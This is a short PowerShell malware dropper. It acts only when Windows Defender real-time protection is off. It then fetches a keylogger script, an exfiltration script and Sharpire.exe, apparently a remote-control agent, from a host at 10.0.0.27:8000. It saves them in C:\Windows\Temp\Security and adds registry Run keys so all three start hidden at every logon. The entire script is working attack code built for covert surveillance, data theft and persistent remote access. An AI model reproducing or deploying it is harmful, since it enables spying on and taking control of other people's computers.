if (Get-MpComputerStatus | Where-Object {$_.RealTimeProtectionEnabled -like 'False'}){
	mkdir C:\Windows\Temp\ExportMe
	mkdir C:\Windows\Temp\Security
	Invoke-WebRequest -URI http://10.0.0.27:8000/KeyLogger.ps1 -OutFile C:\Windows\Temp\Security\KeyLogger.ps1;
	Invoke-WebRequest -URI http://10.0.0.27:8000/Exfil.ps1 -OutFile C:\Windows\Temp\Security\Exfil.ps1;
	Invoke-WebRequest -URI http://10.0.0.27:8000/Sharpire.exe -OutFile C:\Windows\Temp\Security\Sharpire.exe;
	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "KeyLogger" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\KeyLogger.ps1";
	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Exfil" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\Exfil.ps1";
	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Agent" /T REG_SZ /F /D "C:\Windows\Temp\Security\Sharpire.exe"
}


